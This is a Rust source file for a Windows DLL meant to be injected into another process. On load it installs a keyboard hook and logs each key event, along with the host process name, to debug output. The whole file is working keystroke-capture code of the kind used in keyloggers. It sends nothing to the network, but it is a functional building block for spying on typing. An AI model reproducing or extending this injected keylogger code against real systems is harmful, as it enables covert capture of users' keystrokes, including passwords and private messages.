#![cfg(windows)]

use std::iter;

use anyhow::Result;
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{HANDLE, HINSTANCE, LPARAM, LRESULT, MAX_PATH, WPARAM},
        System::{
            Diagnostics::Debug::OutputDebugStringA,
            ProcessStatus::GetProcessImageFileNameA,
            SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
            Threading::GetCurrentThreadId,
        },
        UI::WindowsAndMessaging::{
            CallNextHookEx, SetWindowsHookExA, UnhookWindowsHookEx, HHOOK, WH_KEYBOARD,
        },
    },
};

macro_rules! log {
    ($($arg:tt)*) => {{
        let msg = to_pcstr(&format!($($arg)*));
        OutputDebugStringA(PCSTR(msg.as_ptr()));
    }};
}

static mut HOOK: Option<HHOOK> = None;

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
unsafe extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: u32,
    reserved: *mut (),
) -> bool {
    let mut buf = [0u8; MAX_PATH as usize];
    GetProcessImageFileNameA(HANDLE(-1), &mut buf);
    let name = String::from_utf8_lossy(&buf);

    let result = match call_reason {
        DLL_PROCESS_ATTACH => {
            log!("DLL Injected into: {name}");
            process_attach()
        }
        DLL_PROCESS_DETACH => {
            log!("DLL Unloaded from: {name}");
            process_detach()
        }
        _ => return true,
    };

    if let Err(err) = result {
        log!("Error: {err}");
    }

    true
}

unsafe fn process_attach() -> Result<()> {
    let thread = GetCurrentThreadId();
    log!("Using thread id: {thread:?}");
    let hook = SetWindowsHookExA(WH_KEYBOARD, Some(keyboard_hook), None, thread)?;
    HOOK = Some(hook);

    Ok(())
}

unsafe fn process_detach() -> Result<()> {
    if let Some(hook) = HOOK {
        UnhookWindowsHookEx(hook)?;
    }

    Ok(())
}

unsafe extern "system" fn keyboard_hook(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 {
        let key = w_param.0 as u8 as char;
        log!("Key Event: {key}");
    }

    CallNextHookEx(None, n_code, w_param, l_param)
}

fn to_pcstr(s: &str) -> Vec<u8> {
    s.bytes().chain(iter::once(0)).collect()
}
